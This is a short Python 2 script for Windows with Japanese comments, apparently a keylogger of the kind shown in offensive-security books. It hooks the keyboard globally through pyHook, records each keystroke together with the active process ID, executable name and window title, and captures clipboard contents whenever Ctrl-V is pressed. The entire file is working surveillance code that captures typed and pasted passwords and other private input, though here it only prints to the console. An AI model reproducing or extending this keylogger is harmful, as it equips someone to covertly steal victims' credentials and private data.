# -*- coding: utf-8 -*-

from ctypes import *
import pythoncom
import pyHook
import win32clipboard

user32      = windll.user32
kernel32    = windll.kernel32
psapi       = windll.psapi
current_window = None

def getCurrentProcess():
    # アクティブなWindowsへのハンドルを取得
    hwin = user32.GetForegroundWindow()

    # プロセスIDの取得
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwin, byref(pid))
    process_id = "%d" % pid.value

    # 実行ファイル名の取得
    executable = create_string_buffer("\x00" * 512)
    hproc = kernel32.OpenProcess(0x400 | 0x10, False, pid)
    psapi.GetModuleBaseNameA(hproc, None, byref(executable), 512)

    # ウインドウのタイトルバーの文字列を取得
    window_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwin, byref(window_title), 512)

    # ヘッダー出力
    print "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)
    print

    # 終了処理
    kernel32.CloseHandle(hwin)
    kernel32.CloseHandle(hproc)

def keyStroke(event):
    global current_window

    # 操作中ノウインドウが変更したか確認
    if event.WindowName != current_window:
        current_window = event.WindowName
        getCurrentProcess()

    # 標準的なキーが押下されたか確認
    if event.Ascii > 32 and event.Ascii < 127:
        print chr(event.Ascii),
    else:
        # [Ctrl-V]が押下されたら、クリップボードのデータを取得
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            print "[PASTE] - %s" % (pasted_value),
        else:
            print "[%s]" % event.Key,

    return True

# フックマネージャーの作成
kl = pyHook.HookManager()
kl.KeyDown = keyStroke

kl.HookKeyboard()
pythoncom.PumpMessages()
